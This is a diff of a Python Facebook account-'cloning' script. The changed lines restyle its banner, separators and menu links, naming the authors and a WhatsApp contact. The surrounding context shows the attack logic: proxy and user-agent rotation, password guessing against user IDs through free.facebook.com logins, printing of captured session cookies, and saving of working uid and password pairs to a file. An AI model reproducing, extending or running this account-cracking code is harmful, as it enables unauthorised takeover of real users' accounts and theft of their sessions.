@@ -155,23 +155,27 @@ except Exception as e:
 prox=open('socks5.txt','r').read().splitlines()    
 
 logo=("""                  
-.##..##...####....####....####....####...##..##.
-.##..##..##..##..##......##......##..##..###.##.
-.######..######...####....####...######..##.###.
-.##..##..##..##......##......##..##..##..##..##.
-.##..##..##..##...####....####...##..##..##..##.
-................................................                                                                                       
-\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m Hassan & \033[1;36m Hassan 
-╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m Hassan & \033[1;33m Karimi
-╠══[\033[1;35m[•] TEAM \033[1;34m    :\033[1;33m Hassan-TECH
-╠══[\033[1;34m[•] WhatsApp \033[1;32m:\033[1;34m 93705843630
-╠══[\033[1;33m[•] STATUS\033[1;33m   :\033[1;31m FREE\33[1;37m
-╠══[\033[1;32m[•] VERSION  : 4.5
-\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;37m""")
+ ██░ ██ ▄▄▄█████▓▓█████  ▄████▄   ██░ ██ 
+▓██░ ██▒▓  ██▒ ▓▒▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒
+▒██▀▀██░▒ ▓██░ ▒░▒███   ▒▓█    ▄ ▒██▀▀██░
+░▓█ ░██ ░ ▓██▓ ░ ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ 
+░▓█▒░██▓  ▒██▒ ░ ░▒████▒▒ ▓███▀ ░░▓█▒░██▓
+ ▒ ░░▒░▒  ▒ ░░   ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒
+ ▒ ░▒░ ░    ░     ░ ░  ░  ░  ▒    ▒ ░▒░ ░
+ ░  ░░ ░  ░         ░   ░         ░  ░░ ░
+ ░  ░  ░            ░  ░░ ░       ░  ░  ░
+                        ░                AFG                                                                                        
+\033[0;94m╔━━━━━━━━━━━♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡━━━━━━━━━━━━╗\033[1;33m 
+♡[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m Hassan & \033[1;36m Hassan 
+♡[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m Hassan & \033[1;33m Karimi
+♡[\033[1;35m[•] TEAM \033[1;34m    :\033[1;33m Hassan-TECH
+♡[\033[1;34m[•] WhatsApp \033[1;32m:\033[1;34m 93705843630
+♡[\033[1;33m[•] STATUS\033[1;33m   :\033[1;31m FREE\33[1;37m
+♡[\033[1;32m[•] VERSION  : 4.5
+\033[0;94m╚━━━━━━━━━━♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡━━━━━━━━━━━╝\033[1;37m""")
 
 def lines():
-	print(f'\033[0;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37') 
+	print(f'\033[0;95m✓♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡✓\033[1;37') 
  
 loop = 0
 oks = []
@@ -214,7 +218,7 @@ def riaz():
 	print(logo)
 	print('[1] AFGHAN CLONING')
 	print('[2] PAKISTAN CLONING')
-	print('[3] FOLLOW MY TELEGRAM')
+	print('[3] FOLLOW MY Facebook')
 	print('[0]\x1b[1;91m EXIT ')
 	lines()
 	riaz1 = input('[•] SELECT OPTION : ')
@@ -223,7 +227,7 @@ def riaz():
 	if riaz1 =='0':
 		exit()
 	if riaz1 =='3':
-		os.system('xdg-open https://t.me/karwantech12')
+		os.system('xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share')
 	if riaz1 =='2':
 		bangla()
 	else:
@@ -234,9 +238,9 @@ def riaz():
 def annu():
     os.system('clear')
     print(logo)
-    print('[1] METHOD_1_')
-    print('[2] METHOD_2_')
-    print('[3] METHOD_3_')
+    print('[1] METHOD_1✓')
+    print('[2] METHOD_2✓')
+    print('[3] METHOD_3✓')
     print('[4] \x1b[1;91mBACK MENU ')
     lines()
     riaz1 = input('[+] CHOOSE OPTION : ')
@@ -457,7 +461,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r[\033[1;97m Hassan \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r[\033[1;97m Hassan✓ \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -495,7 +499,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[Hassan-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
+                print('\033[1;32m[Hassan✓-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
                 open('Hassan -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                 oks.append(uid)
                 break
